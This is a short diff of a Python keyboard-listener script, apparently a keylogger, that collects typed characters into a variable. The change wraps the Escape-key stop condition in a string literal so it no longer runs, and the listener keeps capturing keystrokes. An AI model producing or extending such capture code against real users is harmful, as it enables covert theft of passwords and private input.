@@ -40,10 +40,11 @@ def on_press(key):
         char = f'{key}'
         char = char[1:-1]
         word += char
-    # If the escape key pressed, stop the program
+'''
+    # If the escape key pressed, stop the program; used for testing purposes
     if key == Key.esc:
         return False
-
+'''
 # Calls on the on_press function and keeps it running
 with Listener(on_press=on_press) as listener:
     listener.join()
